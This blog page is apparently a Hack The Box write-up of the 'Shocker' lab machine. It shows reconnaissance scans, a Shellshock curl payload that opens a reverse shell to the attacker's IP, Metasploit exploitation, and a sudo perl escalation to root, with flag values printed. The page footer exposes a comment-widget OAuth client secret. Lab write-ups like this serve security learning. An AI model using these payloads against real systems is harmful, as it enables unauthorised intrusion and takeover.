<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Shocker - Hackthebox | Lucifiel&#39;s Blog | Lucifiel æŠ€æœ¯åšå®¢</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - Shockeré¶åœºä¿¡æ¯  é¶åœºç±»å‹  ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;Desktop&#x2F;HTB&#x2F;Easy&#x2F;Shocker] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.56 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-04-01 22:29">
<meta property="og:type" content="article">
<meta property="og:title" content="Shocker - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - Shockeré¶åœºä¿¡æ¯  é¶åœºç±»å‹  ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;Desktop&#x2F;HTB&#x2F;Easy&#x2F;Shocker] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.56 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-04-01 22:29">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/64c68867-7663-4f1f-9728-ec9bb0e80ddf.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/06ff7eaf-ae61-43de-aaab-3e046685bddb.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/5e3364e2-f2d4-4223-8013-e69a2527d7d4.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/5c08d0f2-9ef0-4c87-8204-d320484e4c83.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/77210a46-884f-46be-a4ad-9612a2e8a223.png">
<meta property="article:published_time" content="2022-04-04T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-17T02:25:53.224Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/64c68867-7663-4f1f-9728-ec9bb0e80ddf.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                ä¸»é¡µ
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Shocker - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="è¾“å…¥æ„Ÿå…´è¶£çš„å…³é”®å­—">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Shocker - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2022-04-04T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2022-04-04
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Shocker"><span class="post-toc-text">Hackthebox - Shocker</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#é¶åœºä¿¡æ¯"><span class="post-toc-text">é¶åœºä¿¡æ¯</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#é¶åœºç±»å‹"><span class="post-toc-text">é¶åœºç±»å‹</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ä¿¡æ¯æ”¶é›†"><span class="post-toc-text">ä¿¡æ¯æ”¶é›†</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Fuzz"><span class="post-toc-text">Fuzz</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#æ¼æ´åˆ©ç”¨"><span class="post-toc-text">æ¼æ´åˆ©ç”¨</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Shellshock"><span class="post-toc-text">Shellshock</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exploit-db"><span class="post-toc-text">exploit-db</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Metasploit"><span class="post-toc-text">Metasploit</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ä¿®å¤-shell"><span class="post-toc-text">ä¿®å¤ shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#æƒé™æå‡"><span class="post-toc-text">æƒé™æå‡</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Easy/Hackthebox-Shocker"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Shocker - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2022-04-04 19:38:36" datetime="2022-04-04T11:38:36.000Z"  itemprop="datePublished">2022-04-04</time>

            


            
<span id="busuanzi_container_page_pv" title="æ–‡ç« æ€»é˜…è¯»é‡" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Shocker"><a href="#Hackthebox-Shocker" class="headerlink" title="Hackthebox - Shocker"></a>Hackthebox - Shocker</h1><h1 id="é¶åœºä¿¡æ¯"><a href="#é¶åœºä¿¡æ¯" class="headerlink" title="é¶åœºä¿¡æ¯"></a>é¶åœºä¿¡æ¯</h1><img src="/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/64c68867-7663-4f1f-9728-ec9bb0e80ddf.png" class>

<h1 id="é¶åœºç±»å‹"><a href="#é¶åœºç±»å‹" class="headerlink" title="é¶åœºç±»å‹"></a>é¶åœºç±»å‹</h1><img src="/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/06ff7eaf-ae61-43de-aaab-3e046685bddb.png" class>

<h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Shocker]
â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.56
Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-01 22:29 EDT
Nmap scan report for 10.10.10.56
Host is up (0.25s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn&#39;t have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=4/1%OT=80%CT=1%CU=41565%PV=Y%DS=2%DC=T%G=Y%TM=6247B561
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)SEQ(
OS:SP=102%GCD=1%ISR=10B%TI=Z%II=I%TS=B)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=I%T
OS:S=8)OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=
OS:M505ST11NW6%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7
OS:120)ECN(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A
OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%
OS:Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=
OS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=
OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%
OS:T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 61716/tcp)
HOP RTT       ADDRESS
1   246.66 ms 10.10.14.1
2   246.79 ms 10.10.10.56

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.63 seconds
</code></pre>
<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/5e3364e2-f2d4-4223-8013-e69a2527d7d4.png" class>

<p>è¿™é‡Œä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆä¸œè¥¿ï¼Œå» fuzz ä¸€ä¸‹</p>
<h2 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h2><pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ffuf -u &quot;http://10.10.10.56/FUZZ&quot; -w /usr/share/dirb/wordlists/common.txt                                   

        /&#39;___\  /&#39;___\           /&#39;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 137, Words: 9, Lines: 10]
.hta                    [Status: 403, Size: 290, Words: 22, Lines: 12]
.htaccess               [Status: 403, Size: 295, Words: 22, Lines: 12]
.htpasswd               [Status: 403, Size: 295, Words: 22, Lines: 12]
cgi-bin/                [Status: 403, Size: 294, Words: 22, Lines: 12]
index.html              [Status: 200, Size: 137, Words: 9, Lines: 10]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
:: Progress: [4614/4614] :: Job [1/1] :: 80 req/sec :: Duration: [0:01:00] :: Errors: 0 ::
</code></pre>
<p>çœ‹åˆ°æœ‰ä¸€ä¸ª cgi-bin ç›®å½•ï¼Œç»§ç»­ fuzz</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ffuf -u &quot;http://10.10.10.56/cgi-bin/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -e .sh,.pl

        /&#39;___\  /&#39;___\           /&#39;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/cgi-bin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
 :: Extensions       : .sh .pl 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

user.sh                 [Status: 200, Size: 118, Words: 19, Lines: 8]
                        [Status: 403, Size: 294, Words: 22, Lines: 12]
:: Progress: [60348/60348] :: Job [1/1] :: 152 req/sec :: Duration: [0:15:14] :: Errors: 19 ::
</code></pre>
<p>å‘ç°ä¸€ä¸ª user.sh æ–‡ä»¶ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹</p>
<img src="/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/5c08d0f2-9ef0-4c87-8204-d320484e4c83.png" class>

<p>æœ‰ç‚¹ä¸å¤ªæ˜ç™½è¿™æ˜¯å•¥ï¼Œå» google ä¸€ä¸‹å§</p>
<img src="/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/77210a46-884f-46be-a4ad-9612a2e8a223.png" class>

<blockquote>
<p><a href="https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock" target="_blank" rel="noopener">https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock</a></p>
</blockquote>
<p>æ‰¾åˆ°ä¸€ç¯‡æ–‡ç« </p>
<h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><h2 id="Shellshock"><a href="#Shellshock" class="headerlink" title="Shellshock"></a>Shellshock</h2><p>æ ¹æ®æ–‡ç« å†…å®¹ï¼Œå°è¯•ä¸€ä¸‹åå¼¹ shell</p>
<p>ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£</p>
<pre><code class="bash">nc -nvlp 4444
</code></pre>
<p>ç„¶åå»åˆ©ç”¨</p>
<pre><code class="bash">curl -i -H &quot;User-agent: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.4/4444 0&gt;&amp;1&quot; http://10.10.10.56/cgi-bin/user.sh
</code></pre>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# nc -nvlp 4444                                                                                                                                                                                               1 â¨¯
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.56] 40320
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ whoami&amp;&amp;id
whoami&amp;&amp;id
shelly
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
shelly@Shocker:/usr/lib/cgi-bin$
</code></pre>
<p>æˆåŠŸå¾—åˆ°ä¸€ä¸ª user æƒé™çš„ shell</p>
<h2 id="exploit-db"><a href="#exploit-db" class="headerlink" title="exploit-db"></a>exploit-db</h2><blockquote>
<p><a href="https://www.exploit-db.com/exploits/34900" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/34900</a></p>
</blockquote>
<p>æˆ‘è¿™è¾¹åˆ©ç”¨æœ‰ç‚¹é—®é¢˜ï¼Œå°±ä¸æµ‹è¯•äº†</p>
<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><pre><code class="bash">use exploit/multi/http/apache_mod_cgi_bash_env_exec
</code></pre>
<pre><code class="bash">msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; show options 

Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):

   Name            Current Setting   Required  Description
   ----            ---------------   --------  -----------
   CMD_MAX_LENGTH  2048              yes       CMD max line length
   CVE             CVE-2014-6271     yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER          User-Agent        yes       HTTP header to use
   METHOD          GET               yes       HTTP method to use
   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          10.10.10.56       yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   RPATH           /bin              yes       Target PATH for binaries used by the CmdStager
   RPORT           80                yes       The target port (TCP)
   SRVHOST         0.0.0.0           yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT         8080              yes       The local port to listen on.
   SSL             false             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                           no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI       /cgi-bin/user.sh  yes       Path to CGI script
   TIMEOUT         5                 yes       HTTP read response timeout (seconds)
   URIPATH                           no        The URI to use for this exploit (default is random)
   VHOST                             no        HTTP server virtual host

Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.4       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Linux x86
</code></pre>
<p>è®¾ç½®å¥½ç›¸å…³çš„é…ç½®åï¼Œæ‰§è¡Œ</p>
<pre><code class="bash">msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; exploit 

[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (984904 bytes) to 10.10.10.56
[*] Meterpreter session 2 opened (10.10.14.4:4444 -&gt; 10.10.10.56:40322) at 2022-04-02 00:56:02 -0400

meterpreter &gt; getuid
Server username: shelly @ Shocker (uid=1000, gid=1000, euid=1000, egid=1000)
</code></pre>
<p>è¿™é‡Œä¹ŸæˆåŠŸå›å¼¹</p>
<h2 id="ä¿®å¤-shell"><a href="#ä¿®å¤-shell" class="headerlink" title="ä¿®å¤ shell"></a>ä¿®å¤ shell</h2><pre><code class="bash">python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;;
Ctrl+Zè¿”å›
stty raw -echo; fg
export TERM=xterm
stty rows 51 cols 237
</code></pre>
<pre><code class="bash">shelly@Shocker:/home/shelly$ cat user.txt 
2ec24e11320026d1e70ff3e16695b233
</code></pre>
<p>æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶</p>
<h1 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h1><pre><code class="bash">shelly@Shocker:/home/shelly$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
</code></pre>
<p>ä½¿ç”¨ sudo -l æŸ¥çœ‹å¾—çŸ¥æœ‰æƒé™ä½¿ç”¨ sudo è¿è¡Œ &#x2F;usr&#x2F;bin&#x2F;perl</p>
<blockquote>
<p><a href="https://gtfobins.github.io/gtfobins/perl/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/perl/</a></p>
</blockquote>
<p>perl å¯ä»¥ç”¨ä¸Šé¢çš„æ–¹æ³•ææƒï¼Œå°è¯•ä¸€ä¸‹</p>
<pre><code class="bash">sudo /usr/bin/perl -e &#39;exec &quot;/bin/sh&quot;;&#39;

shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e &#39;exec &quot;/bin/sh&quot;;&#39;
# whoami&amp;&amp;id
root
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>æˆåŠŸææƒåˆ° root æƒé™</p>
<pre><code class="bash"># cat root.txt
52c2715605d70c7619030560dc1ca467
</code></pre>
<p>æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/&title=ã€ŠShocker - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/&title=ã€ŠShocker - Hacktheboxã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠShocker - Hacktheboxã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2022/04/06/Hackthebox/Medium/Hackthebox-Catch/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Catch - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2022/04/03/Hackthebox/Easy/Hackthebox-Blue/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Blue - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        ç«™ç‚¹æ€»è®¿å®¢æ•°ï¼š<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        ç«™ç‚¹æ€»è®¿é—®é‡ï¼š<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2023</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/&title=ã€ŠShocker - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/&title=ã€ŠShocker - Hacktheboxã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠShocker - Hacktheboxã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
